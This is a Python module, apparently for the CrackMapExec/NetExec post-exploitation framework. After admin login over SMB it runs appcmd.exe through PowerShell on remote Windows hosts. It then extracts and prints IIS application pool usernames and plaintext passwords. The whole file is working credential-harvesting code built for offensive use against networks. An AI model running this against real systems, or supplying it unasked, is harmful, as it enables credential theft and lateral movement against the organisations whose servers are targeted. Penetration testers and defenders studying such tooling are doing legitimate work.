#!/usr/bin/env python3
# -*- coding: utf-8 -*-
class CMEModule:

    """
    Checks for credentials in IIS Application Pool configuration files using appcmd.exe.

    Module by Brandon Fisher @shad0wcntr0ller
    """

    name = 'iis'
    description = "Checks for credentials in IIS Application Pool configuration files using appcmd.exe"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        pass

    def options(self, context, module_options):
        pass

    def on_admin_login(self, context, connection):
        self.check_appcmd(context, connection)

    def check_appcmd(self, context, connection):
        
        if not hasattr(connection, 'has_run'):
            connection.has_run = False

        
        if connection.has_run:
            return

        connection.has_run = True

        
        try:
            connection.conn.listPath('C$', '\\Windows\\System32\\inetsrv\\appcmd.exe')
            self.execute_appcmd(context, connection)
        except:
            context.log.fail("appcmd.exe not found, this module is not applicable.")
            return

    def execute_appcmd(self, context, connection):
        command = f'powershell -c "C:\\windows\\system32\\inetsrv\\appcmd.exe list apppool /@t:*"'
        context.log.info(f'Checking For Hidden Credentials With Appcmd.exe')
        output = connection.execute(command, True)
        
        lines = output.splitlines()
        username = None
        password = None
        apppool_name = None

        credentials_set = set()

        for line in lines:
            if 'APPPOOL.NAME:' in line:
                apppool_name = line.split('APPPOOL.NAME:')[1].strip().strip('"')
            if "userName:" in line:
                username = line.split("userName:")[1].strip().strip('"')
            if "password:" in line:
                password = line.split("password:")[1].strip().strip('"')

            
            if apppool_name and username is not None and password is not None:  
                current_credentials = (apppool_name, username, password)

                if current_credentials not in credentials_set:
                    credentials_set.add(current_credentials)
                    
                    if username:
                        context.log.success(f"Credentials Found for APPPOOL: {apppool_name}")
                        if password == "":
                            context.log.highlight(f"Username: {username} - User Does Not Have A Password")
                        else:
                            context.log.highlight(f"Username: {username}, Password: {password}")

                
                username = None
                password = None
                apppool_name = None

        if not credentials_set:
            context.log.fail("No credentials found :(")
